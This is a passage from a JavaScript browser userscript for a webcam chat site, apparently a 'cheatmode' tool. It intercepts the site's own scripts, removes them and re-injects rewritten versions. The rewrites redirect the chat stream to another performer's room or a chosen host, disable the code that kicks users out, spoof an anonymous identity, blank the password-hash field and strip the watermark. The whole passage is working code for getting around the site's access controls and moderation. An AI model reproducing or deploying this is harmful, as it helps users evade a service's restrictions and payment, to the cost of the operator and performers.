            e.stopPropagation();
            e.target.parentNode.removeChild(e.target);
     
            scrip=document.createElement('script');
            scrip.id="newvid";
     
            script=script.replace("http://ccstatic.highwebmedia.com/static/images/flashwatermark.png","");
     
     
     
            if (!readCookie("cheatmode")){
            scrip.innerHTML=script;
            document.getElementsByTagName('body')[0].appendChild(scrip);   
            return} // only do the rest if we are in cheatmode , return here if in normal mode
     
            mode=readCookie("cheatmode").split("&");
            preformer=mode[0];
            anon=mode[1];
            mob=mode[2];
            chost=mode[3];
     
            orgname=document.location.href.split("/")[4];
     
            var patrn = new RegExp(orgname,"ig");
            script=script.replace(patrn,preformer);
     
            if((anon==1)||(mob==1)){
            pos1 = script.indexOf('ProductInstall.swf",');
            pos2 = script.indexOf("',",pos1);
            script=script.replace(script.substring(pos1,pos2),'ProductInstall.swf",\n            \'AnonymousUser');
     
            pos1 = script.indexOf("pbkdf2_sha256");
            pos2 = script.indexOf("',",pos1);
            script=script.replace(script.substring(pos1,pos2),"anonymous");
            }
     
            scrip.innerHTML=script;
            document.getElementsByTagName('body')[0].appendChild(scrip);
     
            }}
     
    // next only if in cheatmode
            if (!readCookie("cheatmode")){return}
            mode=readCookie("cheatmode").split("&");
            preformer=mode[0];
            anon=mode[1];
            mob=mode[2];
            chost=mode[3];
     
            orgname=document.location.href.split("/")[4];
     
            if(e.target.innerHTML.indexOf("function log_presence()")!= -1){ // check for script , this is chat init script
     
            if(!e.target.id){// already altered ? , then ID is set
     
            script=e.target.innerHTML;
            e.preventDefault();
            e.stopPropagation();
            e.target.parentNode.removeChild(e.target);
     
            var patrn = new RegExp(orgname,"ig");
            script=script.replace(patrn,preformer);
     
            script=script.replace("rtmp://chat1",chost);
            script=script.replace("rtmp://chat2",chost);
     
            script=script.replace("allow_tipping: false","allow_tipping: true"); // if original is an exhib.
     
            script=script.replace("window.location.reload()","return"); // no more kick
     
            pos1 = script.indexOf("num_users_waiting_for_group_show"); // in case original page got users waiting, if so it will show in chat
            script=script.replace(script.substring(pos1,pos1+35),"num_users_waiting_for_group_show: 0");
     
            if (mob==1){
            script=script.replace("force_handler: null","force_handler: html_handler")}
     
            if(anon==1){
            rd="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890";
            username="";
            l=5+Math.floor((Math.random()*6)+1);
            for (i=0; i<l; i++){
            rand = Math.floor(Math.random()*rd.length);
            username=username+rd.charAt(rand)}
            username = "__anonymous__"+username;
     
            pos1 = script.indexOf("username: '");
            pos2 = script.indexOf("',",pos1);
            script=script.replace(script.substring(pos1,pos2),"username: '"+username);
     
            pos1 = script.indexOf("my_username: '");
            pos2 = script.indexOf("',",pos1);
            script=script.replace(script.substring(pos1,pos2),"my_username: '");
     
            pos1 = script.indexOf("token_balance:");
            pos2 = script.indexOf(",",pos1);
            script=script.replace(script.substring(pos1,pos2),"token_balance: 0")
     
            pos1 = script.indexOf("pbkdf2_sha256");
            pos2 = script.indexOf("',",pos1);
            script=script.replace(script.substring(pos1,pos2),"anonymous");
            } // end if anon
     
     
            scrip=document.createElement('script');
            scrip.id="newchat";
     
            scrip.innerHTML=script;
            document.getElementsByTagName('body')[0].appendChild(scrip);
     
            }}
     
    // next room url or else sorted userlist fails
            if(e.target.innerHTML.indexOf("nextroomurl")!= -1){ // check for script - this is the nextroom script
     
            if(!e.target.id){// already altered ? , then ID is set
           
            script=e.target.innerHTML;
            e.preventDefault();
            e.stopPropagation();
            e.target.parentNode.removeChild(e.target);
     
            var patrn = new RegExp(orgname,"ig");
            script=script.replace(patrn,preformer);
     
            scrip=document.createElement('script');
            scrip.id="newnext";
     
            scrip.innerHTML=script;
            document.getElementsByTagName('body')[0].appendChild(scrip);
     
            }}
            }
     
    window.addEventListener("DOMContentLoaded", function() { do_script() }, false);
     
    window.addEventListener('beforescriptexecute', function(e) {do_script2(e) }, false);
     
    //.user.js
